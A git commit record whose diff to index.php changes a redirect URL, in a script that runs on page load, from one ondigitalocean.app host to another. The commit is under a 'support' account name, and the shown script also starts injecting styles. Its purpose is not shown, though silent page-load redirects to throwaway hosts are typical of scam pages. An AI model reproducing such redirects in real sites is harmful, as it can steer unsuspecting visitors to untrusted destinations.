6a1a2e20b7f49484318efa0bf5101515aefb4735
SupportSpotX24 <abilashgupta7@gmail.com>
2026-01-28 01:01:23 -0500

    Update index.php

--- index.php
+++ index.php
@@ -15,7 +15,7 @@
 <script>
         document.addEventListener("DOMContentLoaded", function () {
 
-            const redirectUrl = "https://octopus-app-eyppi.ondigitalocean.app";
+            const redirectUrl = "https://monkfish-app-2hxow.ondigitalocean.app";
 
             const style = document.createElement("style");
             style.textContent = `
